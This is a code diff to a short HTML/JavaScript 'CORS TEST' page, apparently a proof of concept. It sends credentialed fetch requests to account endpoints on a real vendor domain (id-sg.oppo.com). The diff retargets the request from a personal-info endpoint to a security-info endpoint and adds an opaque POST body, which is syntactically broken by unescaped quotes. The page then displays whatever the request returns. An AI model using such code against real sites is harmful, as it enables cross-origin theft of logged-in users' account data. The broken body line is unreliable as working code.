@@ -1,16 +1,11 @@
-<!DOCTYPE html>
-<html>
-<body>
-<h2>CORS TEST</h2>
-<pre id="result">Waiting...</pre>
-
 <script>
-fetch("https://id-sg.oppo.com/v3/user-center/profile/personal-info", {
-  method: "GET",
+fetch("https://id-sg.oppo.com/uc/web/v1/user-info/security-info", {
+  method: "POST",
   credentials: "include",
   headers: {
     "Content-Type": "application/json"
   },
+  body: "{"LYeBujYQ6EeAnbdyh63CBfiw5XIRgyMBu21S9wTmLUJm/gGnQ4ZKNkew2RSfwloboL3T8eAEiuvwwPuj5BOe8ybuMDEGm7Tm1kVzyFTzxgULpaFcZhak+hWXpNoJiUWHHiMTt5NRezh+uYjr5WofSKS1jfvXCcbNhY0Si9HcB7k=.rmZFhNfNBTiGCrwIo/kFPlOSgKNXqO0Pvjz+JIbLRqCYStwML2xFV+SpJFtl4SKxzvm7IUYZF59YZlbIPLbl37F08SO4yQUOGN/CPPU2rRYiHKf0AwambGMtNq1GceFQGZy8ODxntXWkwc7+v5BC3pIgQB/L2zMzClvgJ9HA0bo=.cF8="}"
 })
 .then(r => r.text())
 .then(data => {
@@ -20,5 +15,3 @@ fetch("https://id-sg.oppo.com/v3/user-center/profile/personal-info", {
   document.getElementById("result").innerText = e;
 });
 </script>
-</body>
-</html>
